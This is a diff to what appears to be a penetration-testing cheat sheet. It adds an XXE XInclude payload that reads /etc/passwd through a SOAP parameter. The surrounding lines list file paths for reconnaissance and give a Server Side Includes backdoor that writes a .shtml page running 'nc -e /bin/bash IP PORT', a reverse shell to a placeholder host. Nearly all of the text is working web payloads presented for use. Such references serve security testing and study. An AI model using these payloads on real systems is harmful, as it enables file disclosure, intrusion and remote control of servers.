@@ -558,6 +558,14 @@ Also to check `/etc/nginx/sites-available/default`
 
 To see list of processes running on the system we can read this file `/proc/sched_debug`
 
+### XXE - XIncludes Attack
+
+We can use XInclude when SOAP is being used in an application and we can't introduce DTD , so we'll have to replace a value of a paramter with <br/>
+```
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+
 ### SSI (Server Side Includes)
 
 ` echo '<!--#exec cmd="nc -e /bin/bash IP PORT" -->' > backdoor.shtml`
